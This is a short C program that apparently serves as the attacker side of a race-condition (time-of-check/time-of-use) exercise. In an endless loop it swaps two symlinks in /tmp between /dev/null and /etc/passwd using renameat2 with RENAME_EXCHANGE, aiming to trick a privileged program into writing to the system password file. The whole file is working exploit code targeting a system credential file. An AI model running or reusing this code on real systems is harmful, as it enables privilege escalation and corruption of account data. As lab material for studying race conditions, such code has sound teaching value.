#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>  



int main(void) {
    unsigned int flags = RENAME_EXCHANGE;
    while (1) {
        unlink("/tmp/XYZ");
        symlink("/dev/null", "/tmp/XYZ");
        unlink("/tmp/ABC");
        symlink("/etc/passwd", "/tmp/ABC");
        renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
    }
    return 0;
}
